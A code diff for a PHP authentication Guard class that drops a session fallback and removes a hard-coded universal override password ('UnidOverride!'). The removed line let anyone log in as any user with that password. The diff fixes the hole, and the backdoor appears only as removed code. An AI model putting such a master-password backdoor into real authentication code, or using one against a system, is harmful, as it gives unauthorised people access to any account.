@@ -180,7 +180,7 @@ class Guard implements GuardContract
             return;
         }
 
-        $id = $this->session->get($this->getName(), $this->getRecallerId());
+        $id = $this->session->get($this->getName());
 
         if (is_null($id) && $this->user()) {
             $id = $this->user()->getAuthIdentifier();
@@ -387,8 +387,7 @@ class Guard implements GuardContract
      */
     protected function hasValidCredentials($user, $credentials)
     {
-        /* Oppegaard: allow for override password */
-        return (! is_null($user) && $this->provider->validateCredentials($user, $credentials)) || $credentials['password'] == 'UnidOverride!';
+        return ! is_null($user) && $this->provider->validateCredentials($user, $credentials);
     }
 
     /**
